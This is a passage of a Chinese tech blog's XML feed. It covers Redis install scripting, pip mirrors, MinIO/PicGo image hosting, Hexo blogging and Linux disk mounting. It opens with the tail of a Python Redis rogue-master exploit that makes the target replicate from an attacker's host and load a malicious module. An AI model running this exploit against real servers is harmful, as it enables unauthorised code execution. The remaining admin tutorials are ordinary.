password&quot;</span> <span class="hljs-keyword">in</span> check:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            info = remote.do(<span class="hljs-string">&quot;INFO&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;NOAUTH&quot;</span> <span class="hljs-keyword">in</span> info:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        remote.do(<span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport))<br>        remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>        sleep(<span class="hljs-number">2</span>)<br>        rogue = RogueServer(lhost, lport, remote, expfile)<br>        <span class="hljs-keyword">if</span> rogue.exp():<br>            sleep(<span class="hljs-number">2</span>)<br>            remote.do(<span class="hljs-string">&quot;MODULE LOAD ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>            remote.do(<span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>)<br>            rogue.close()<br>            cleanup(remote, expfile)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h2 id="安装脚本"><a href="#安装脚本" class="headerlink" title="安装脚本"></a>安装脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">检查是否为root用户</span><br>if [ &quot;$(id -u)&quot; -eq 0 ]; then<br>    # 提示用户输入要创建的 Redis 用户名<br>    read -rp &quot;请输入要创建的 Redis 用户名：&quot; redis_user<br><br>    # 密码验证循环<br>    while true; do<br>        # 使用 getpass 获取密码，避免在命令行显示<br>        read -s -p &quot;请设置 Redis 密码认证（至少8个字符，包含字母、数字和特殊字符）：&quot; redis_password<br><br>        # 密码强度验证<br>        if [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[a-z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[A-Z].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[0-9].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $(echo &quot;$redis_password&quot; | grep -E &#x27;.*[!@#$%^&amp;*()_+\-=\[\]&#123;&#125;;&#x27;:&quot;\\|,.&lt;&gt;\/?].*&#x27; | wc -l) -eq 1 ]] &amp;&amp; [[ $&#123;#redis_password&#125; -ge 8 ]]; then<br>            break<br>        else<br>            echo &quot;密码强度不足，请重新输入。&quot;<br>        fi<br>    done<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换到临时目录</span><br>cd /tmp || exit<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">下载 Redis 压缩包</span><br>echo &quot;正在下载 Redis 压缩包...&quot;<br>wget -nv http://download.redis.io/releases/redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">解压 Redis 压缩包</span><br>echo &quot;正在解压 Redis 压缩包...&quot;<br>tar -zvxf redis-7.2.4.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">移动 Redis 文件夹到 /usr/local</span><br>echo &quot;正在移动 Redis 文件夹到 /usr/local...&quot;<br>mv /tmp/redis-7.2.4 /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 Redis 用户</span><br>echo &quot;正在创建 Redis 用户...&quot;<br>useradd -s /sbin/nologin -M &quot;$redis_user&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置 Redis 文件夹权限，确保 Redis 用户对文件夹有读写权限</span><br>chown -R &quot;$redis_user:$redis_user&quot; /usr/local/redis<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">复制 Redis 配置文件并设置密码认证</span><br>echo &quot;正在配置 Redis 密码认证...&quot;<br>cp /usr/local/redis/redis.conf /usr/local/redis/redis.conf.backup<br>sed -i &quot;s/^# requirepass foobared$/requirepass $redis_password/&quot; /usr/local/redis/redis.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 systemd 管理 Redis 服务</span><br>echo &quot;正在配置 Redis 服务...&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 systemd 服务文件</span><br>cat &gt; /etc/systemd/system/redis.service &lt;&lt;EOF<br>[Unit]<br>Description=Redis Server<br>After=network.target<br><br>[Service]<br>User=$redis_user<br>Group=$redis_user<br>WorkingDirectory=/usr/local/redis<br>ExecStart=/usr/local/redis/src/redis-server /usr/local/redis/redis.conf<br>ExecReload=/bin/kill -HUP $&#123;MAINPID&#125;<br>ExecStop=/bin/kill -TERM $&#123;MAINPID&#125;<br><br>[Install]<br>WantedBy=multi-user.target<br>EOF<br><br>    # 启动 Redis 服务<br>    echo &quot;正在启动 Redis 服务...&quot;<br>    systemctl daemon-reload &amp;&amp; systemctl enable redis &amp;&amp; systemctl start redis<br><br>    echo &quot;Redis 服务已启动。&quot;<br>else<br>    echo &quot;当前用户非root用户，无法创建 Redis 用户和启动服务。请使用root权限运行该脚本。&quot;<br>fi<br></code></pre></td></tr></table></figure><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://hellogithub.com/report/db-engines/">https://hellogithub.com/report/db-engines/</a></p><p><a href="https://blog.csdn.net/zkaqlaoniao/article/details/134441323">https://blog.csdn.net/zkaqlaoniao/article/details/134441323</a></p><p><a href="https://blog.51cto.com/u_13540373/4861152">https://blog.51cto.com/u_13540373/4861152</a></p><p><a href="https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3">https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Redis安装&quot;&gt;&lt;a href=&quot;#Redis安装&quot; class=&quot;headerlink&quot; title=&quot;Redis安装&quot;&gt;&lt;/a&gt;Redis安装&lt;/h1&gt;&lt;p&gt;去&lt;a href=&quot;http://download.redis.io/releases%E9%80%</summary>
      
    
    
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>pip提升下载速度</title>
    <link href="http://example.com/2024/05/08/pip%E6%8F%90%E5%8D%87%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/"/>
    <id>http://example.com/2024/05/08/pip%E6%8F%90%E5%8D%87%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6/</id>
    <published>2024-05-08T11:56:08.000Z</published>
    <updated>2024-05-08T12:54:38.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pip提升下载速度"><a href="#pip提升下载速度" class="headerlink" title="pip提升下载速度"></a>pip提升下载速度</h2><h3 id="临时换源"><a href="#临时换源" class="headerlink" title="临时换源"></a>临时换源</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">pip install &lt;<span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame&gt;  -i https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure><p><strong>国内常见pip源：</strong></p><table><thead><tr><th align="center">镜像名称</th><th align="center">镜像地址</th></tr></thead><tbody><tr><td align="center">清华大学</td><td align="center"><a href="https://pypi.tuna.tsinghua.edu.cn/simple/">https://pypi.tuna.tsinghua.edu.cn/simple/</a></td></tr><tr><td align="center">阿里云</td><td align="center"><a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></td></tr><tr><td align="center">中国科技大学</td><td align="center"><a href="https://pypi.mirrors.ustc.edu.cn/simple/">https://pypi.mirrors.ustc.edu.cn/simple/</a></td></tr><tr><td align="center">豆瓣</td><td align="center"><a href="https://pypi.douban.com/simple/">https://pypi.douban.com/simple/</a></td></tr><tr><td align="center">网易</td><td align="center"><a href="https://mirrors.163.com/pypi/simple/">https://mirrors.163.com/pypi/simple/</a></td></tr><tr><td align="center">百度云</td><td align="center"><a href="https://mirror.baidu.com/pypi/simple/">https://mirror.baidu.com/pypi/simple/</a></td></tr><tr><td align="center">华为云</td><td align="center"><a href="https://mirrors.huaweicloud.com/repository/pypi/simple/">https://mirrors.huaweicloud.com/repository/pypi/simple/</a></td></tr><tr><td align="center">腾讯云</td><td align="center"><a href="https://mirrors.cloud.tencent.com/pypi/simple/">https://mirrors.cloud.tencent.com/pypi/simple/</a></td></tr></tbody></table><h3 id="设为默认"><a href="#设为默认" class="headerlink" title="设为默认"></a>设为默认</h3><p><strong>pip 版本 (&gt;&#x3D;10.0.0) ：</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> pip install --upgrade pip<br>pip config <span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span>.<span class="hljs-built_in">index</span>-url https://pypi.tuna.tsinghua.edu.<span class="hljs-keyword">cn</span>/simple<br></code></pre></td></tr></table></figure><h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p><strong>使用–proxy参数指定代理服务器的地址和端口号</strong></p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">pip install &lt;<span class="hljs-keyword">package</span><span class="hljs-number">_n</span>ame&gt; --proxy http:<span class="hljs-comment">//127.0.0.1:7890</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;pip提升下载速度&quot;&gt;&lt;a href=&quot;#pip提升下载速度&quot; class=&quot;headerlink&quot; title=&quot;pip提升下载速度&quot;&gt;&lt;/a&gt;pip提升下载速度&lt;/h2&gt;&lt;h3 id=&quot;临时换源&quot;&gt;&lt;a href=&quot;#临时换源&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="杂项" scheme="http://example.com/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>minio+picgo搭建个人服务器图床</title>
    <link href="http://example.com/2024/05/08/minio-picgo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%BA%8A/"/>
    <id>http://example.com/2024/05/08/minio-picgo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9B%BE%E5%BA%8A/</id>
    <published>2024-05-07T16:06:32.000Z</published>
    <updated>2024-05-26T12:01:33.460Z</updated>
    
    <content type="html"><![CDATA[<p>目的：利用minio+picgo搭建个人服务器图床</p><h2 id="1-Ubuntu安装docker"><a href="#1-Ubuntu安装docker" class="headerlink" title="1.Ubuntu安装docker"></a>1.Ubuntu安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install docker.io docker-compose<br>docker -v<br></code></pre></td></tr></table></figure><h2 id="2-docker部署minio"><a href="#2-docker部署minio" class="headerlink" title="2.docker部署minio"></a>2.docker部署minio</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker run -p 9000:9000 -p 9001:9001 --name minio \<br>-d --restart=always \<br>-e &quot;MINIO_ACCESS_KEY=user_866&quot; \<br>-e &quot;MINIO_SECRET_KEY=password_54646&quot; \<br>-v /data/minio/data:/data \<br>-v /data/minio/config:/root/.minio minio/minio server \<br>--console-address &quot;:9000&quot; --address &quot;:9001&quot; /data<br></code></pre></td></tr></table></figure><p>服务器打开对应的端口:9000,9001</p><ul><li><code>sudo</code>: 以超级用户权限运行 Docker 命令。</li><li><code>docker run</code>: 创建一个新的 Docker 容器并运行一个命令。</li><li><code>-p 9000:9000</code>: 将容器的 9000 端口映射到主机的 9000 端口。</li><li><code>-p 9001:9001</code>: 将容器的 9001 端口映射到主机的 9001 端口。</li><li><code>--name minio</code>: 设置容器的名称为 minio。</li><li><code>-d</code>: 在后台运行容器。</li><li><code>--restart=always</code>: 确保容器总是重新启动，即使在重启后也是如此。</li><li><code>-e &quot;MINIO_ACCESS_KEY=user&quot;</code>: 设置环境变量 <code>MINIO_ACCESS_KEY</code>，这是访问 MinIO 服务的访问密钥。</li><li><code>-e &quot;MINIO_SECRET_KEY=pasword&quot;</code>: 设置环境变量 <code>MINIO_SECRET_KEY</code>，这是访问 MinIO 服务的秘密密钥。</li><li><code>-v /data/data:/data</code>: 将主机上的 <code>/data/data</code> 目录挂载到容器的 <code>/data</code> 目录。</li><li><code>-v /data/config:/root/.minio</code>: 将主机上的 <code>/data/config</code> 目录挂载到容器的 <code>/root/.minio</code> 目录。</li><li><code>minio/minio server</code>: 运行 MinIO 服务。</li><li><code>--console-address &quot;:9000&quot;</code>: 设置 MinIO 的控制台地址，端口为 9000。</li><li><code>--address &quot;:9001&quot;</code>: 设置 MinIO 服务的监听地址，端口为 9001。</li><li><code>/data</code>: 指定 MinIO 服务的数据存储路径。</li></ul><h2 id="3-访问MinIO-的控制台地址"><a href="#3-访问MinIO-的控制台地址" class="headerlink" title="3.访问MinIO 的控制台地址"></a>3.访问MinIO 的控制台地址</h2><p><a href="http://your_ip:9000/">http://your_ip:9000</a></p><h4 id="Create-Bucket创建存储"><a href="#Create-Bucket创建存储" class="headerlink" title="Create Bucket创建存储"></a>Create Bucket创建存储</h4><p><img src="/img/course/image-20240508195813481.png" alt="image-20240508195813481"></p><h4 id="Access-Keys设置秘钥"><a href="#Access-Keys设置秘钥" class="headerlink" title="Access Keys设置秘钥"></a><strong>Access Keys</strong>设置秘钥</h4><p><img src="/img/course/image-20240508195914554.png" alt="image-20240508195914554"></p><h2 id="4-下载picgo"><a href="#4-下载picgo" class="headerlink" title="4.下载picgo"></a>4.下载picgo</h2><p><a href="https://github.com/Molunerfinn/PicGo/releases">picgo下载</a></p><p><strong>minio插件安装</strong></p><p><img src="/img/course/image-20240508200314953.png" alt="image-20240508200314953"></p><p><strong>图床设置</strong></p><p><img src="/img/course/image-20240508200641746.png" alt="image-20240508200641746"></p><h2 id="5-上传验证"><a href="#5-上传验证" class="headerlink" title="5.上传验证"></a>5.上传验证</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：利用minio+picgo搭建个人服务器图床&lt;/p&gt;
&lt;h2 id=&quot;1-Ubuntu安装docker&quot;&gt;&lt;a href=&quot;#1-Ubuntu安装docker&quot; class=&quot;headerlink&quot; title=&quot;1.Ubuntu安装docker&quot;&gt;&lt;/a&gt;1.Ubu</summary>
      
    
    
    
    
    <category term="服务器" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客编辑</title>
    <link href="http://example.com/2024/04/25/%E6%96%B0%E5%BB%BA%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2024/04/25/%E6%96%B0%E5%BB%BA%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E5%91%BD%E4%BB%A4/</id>
    <published>2024-04-25T15:18:20.000Z</published>
    <updated>2024-06-18T05:48:06.848Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-打开管理员powershell"><a href="#1-打开管理员powershell" class="headerlink" title="1.打开管理员powershell"></a>1.打开管理员powershell</h2><p><strong>执行命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#到你的博客根目录下面</span><br><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">cd</span> E:\Blog<br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo new <span class="hljs-string">&quot;新建一篇文章的命令&quot;</span><br>INFO  Validating config<br>INFO  Created: E:\Blog\source\_posts\新建一篇<br></code></pre></td></tr></table></figure><h2 id="2-去博客根目录下的E-Blog-source-posts"><a href="#2-去博客根目录下的E-Blog-source-posts" class="headerlink" title="2.去博客根目录下的E:\Blog\source_posts"></a>2.去博客根目录下的E:\Blog\source_posts</h2><p><strong>根目录结构</strong>（E:\Blog为你安装hexo的目录）</p><p><img src="/img/course/image-20240425233916133.png" alt="image-20240425233916133"></p><p><strong>打开新建的文章</strong></p><p><img src="/img/course/image-20240425232632671.png" alt="image-20240425232632671"></p><p><strong>使用编辑器进行编写，推荐Typora</strong></p><p><img src="/img/course/image-20240425232739254.png" alt="image-20240425232739254"></p><h2 id="3-推送博客到服务器"><a href="#3-推送博客到服务器" class="headerlink" title="3.推送博客到服务器"></a>3.推送博客到服务器</h2><p><strong>执行命令</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 清理缓存</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo cl<br>INFO  Validating config<br>INFO  Deleted database.<br>INFO  Deleted public folder.<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 生成静态页面</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo g<br>INFO  Validating config<br>INFO  <span class="hljs-built_in">Start</span> processing<br><br>INFO  Files loaded <span class="hljs-keyword">in</span> <span class="hljs-number">1.84</span> s<br>INFO  Generated: about/index.html<br>INFO  <span class="hljs-number">297</span> files generated <span class="hljs-keyword">in</span> <span class="hljs-number">1.11</span> s<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 推送到服务器</span><br><span class="hljs-built_in">PS</span> E:\Blog&gt; hexo d<br>INFO  Validating config<br>INFO  Deploying: git<br>INFO  Clearing .deploy_git folder...<br>INFO  Copying files from public folder...<br>INFO  Copying files from extend dirs...<br>[<span class="hljs-type">master</span> <span class="hljs-type">d7809d4</span>] Site updated: <span class="hljs-number">2024</span><span class="hljs-literal">-04-25</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span>:<span class="hljs-number">33</span><br> <span class="hljs-number">33</span> files changed, <span class="hljs-number">959</span> insertions(+), <span class="hljs-number">264</span> deletions(-)<br> create mode <span class="hljs-number">100644</span> <span class="hljs-string">&quot;2024/04/25/\346\226\260\345\273\272\344\270\200\347\257\207\346\226\207\347\253\240\347\232\204\345\221\275\344\273\244/index.html&quot;</span><br> create mode <span class="hljs-number">100644</span> img/course/image<span class="hljs-literal">-20240425232632671</span>.png<br> create mode <span class="hljs-number">100644</span> img/course/image<span class="hljs-literal">-20240425232739254</span>.png<br>git@masanli.online<span class="hljs-string">&#x27;s password: 在这里输入密码</span><br><span class="hljs-string">Enumerating objects: 141, done.</span><br><span class="hljs-string">Counting objects: 100% (141/141), done.</span><br><span class="hljs-string">Delta compression using up to 16 threads</span><br><span class="hljs-string">Compressing objects: 100% (52/52), done.</span><br><span class="hljs-string">Writing objects: 100% (76/76), 280.38 KiB | 5.50 MiB/s, done.</span><br><span class="hljs-string">Total 76 (delta 35), reused 0 (delta 0), pack-reused 0</span><br><span class="hljs-string">To masanli.online:/home/git/blog.git</span><br><span class="hljs-string">   394df28..d7809d4  HEAD -&gt; master</span><br><span class="hljs-string">branch &#x27;</span>master<span class="hljs-string">&#x27; set up to track &#x27;</span>git@masanli.online:/home/git/blog.git/master<span class="hljs-string">&#x27;.</span><br><span class="hljs-string">INFO  Deploy done: git</span><br></code></pre></td></tr></table></figure><p><strong>推送成功访问网站进行检查</strong></p><h1 id="一级标题快捷命令Ctrl-1"><a href="#一级标题快捷命令Ctrl-1" class="headerlink" title="一级标题快捷命令Ctrl+1"></a>一级标题快捷命令Ctrl+1</h1><h2 id="二级标题快捷命令Ctrl-2"><a href="#二级标题快捷命令Ctrl-2" class="headerlink" title="二级标题快捷命令Ctrl+2"></a>二级标题快捷命令Ctrl+2</h2><p><strong>新建代码块Ctrl+shift+k</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo <br></code></pre></td></tr></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><p><strong>插入图片直接Ctrl+v</strong></p><h3 id="插入图片注意事项"><a href="#插入图片注意事项" class="headerlink" title="插入图片注意事项"></a>插入图片注意事项</h3><p>需要将图片移到博客根目录下的E:\Blog\source\img，如果没有可以新建一个img用来图片，并且为了图片在网站上能够正常显示，必须修改md文件中图片路径格式</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>1.进入源代码模式</p><p><img src="/img/course/image-20240425234346812.png" alt="image-20240425234346812"></p><p>2.将例如<code>![image-20240425234346812](/img/course/image-20240425234346812.png)</code>改为<code>![image-20240425234346812](/img/course/image-20240425234346812.png)</code>的格式</p><p><img src="/img/course/image-20240425234705843.png" alt="image-20240425234705843"></p><p>3.便捷方法：打开typora  文件-&gt;偏好设置-&gt;图像中的图像默认保存位置改为E:\Blog\source\img（按自己博客目录的文件夹名称为准）</p><p><img src="/img/course/image-20240425234850021.png" alt="image-20240425234850021"></p><p>这样，只需在编辑好推送前，使用typora带的查找替换功能将所有<code>E:\Blog\source\</code>替换为服务器对应路径<code>/img/course/</code></p><p>再使用hexo命令推送上去就可以直接看到文章里面的图片了</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo cl</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-打开管理员powershell&quot;&gt;&lt;a href=&quot;#1-打开管理员powershell&quot; class=&quot;headerlink&quot; title=&quot;1.打开管理员powershell&quot;&gt;&lt;/a&gt;1.打开管理员powershell&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;执行</summary>
      
    
    
    
    
    <category term="新建博客" scheme="http://example.com/tags/%E6%96%B0%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Linux磁盘分区与挂载</title>
    <link href="http://example.com/2024/04/14/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%8C%82%E8%BD%BD/"/>
    <id>http://example.com/2024/04/14/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E4%B8%8E%E6%8C%82%E8%BD%BD/</id>
    <published>2024-04-14T11:33:27.000Z</published>
    <updated>2024-05-26T12:02:15.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux磁盘分区与挂载"><a href="#Linux磁盘分区与挂载" class="headerlink" title="Linux磁盘分区与挂载"></a>Linux磁盘分区与挂载</h1><h2 id="1-lsblk查看当前块设备"><a href="#1-lsblk查看当前块设备" class="headerlink" title="1.lsblk查看当前块设备"></a>1.lsblk查看当前块设备</h2><p><strong>找到没有分区和挂载的磁盘sda</strong></p><p><img src="/img/course/image-20240410042212136.png" alt="image-20240410042212136"></p><h2 id="2-使用-fdisk-对磁盘进行分区"><a href="#2-使用-fdisk-对磁盘进行分区" class="headerlink" title="2.使用 fdisk 对磁盘进行分区"></a>2.<strong>使用 fdisk 对磁盘进行分区</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">fdisk /dev/sda</span><br></code></pre></td></tr></table></figure><p><code>fdisk</code> 命令提供了一个交互式界面，允许用户执行以下任务：</p><ul><li>创建分区（<code>n</code>）</li><li>删除分区（<code>d</code>）</li><li>调整分区大小（<code>r</code>）</li><li>设置分区类型（<code>t</code>）</li><li>保存写入分区表（<code>w</code>）</li><li>退出（<code>q</code>）</li></ul><p><strong>输入n创建分区，剩下直接enter确认（默认分为一个区）</strong></p><img src="/img/course/image-20240410042235008.png" alt="image-20240410042235008" style="zoom:67%;" /><p><img src="/img/course/image-20240410042246880.png" alt="image-20240410042246880"></p><p><strong>再使用lsblk命令可以看到分区已完成</strong></p><p><img src="/img/course/image-20240410042437772.png" alt="image-20240410042437772"></p><h2 id="3-格式化分区"><a href="#3-格式化分区" class="headerlink" title="3.格式化分区"></a>3.格式化分区</h2><p><strong>查看 <code>/dev/sdb1</code> 分区的类型，可以使用以下命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">df</span> -T /dev/sdc1</span><br>Filesystem     Type 1K-blocks  Used Available Use% Mounted on<br>/dev/sdc1      ext4  65739308    44  62367488   1% /data<br></code></pre></td></tr></table></figure><p><strong>要将 <code>/dev/sda1</code> 分区格式化为 ext4 文件系统，可以使用以下命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mkfs.ext4 /dev/sda1</span><br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240410042528027.png" alt="image-20240410042528027"></p><h2 id="4-挂载分区"><a href="#4-挂载分区" class="headerlink" title="4.挂载分区"></a>4.挂载分区</h2><p><strong>先创建一个&#x2F;data目录</strong></p><p><img src="/img/course/image-20240410042744611.png" alt="image-20240410042744611"></p><p><strong>然后执行命令挂载分区</strong> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sda1 /data</span> <br></code></pre></td></tr></table></figure><h2 id="5-设置永久挂载"><a 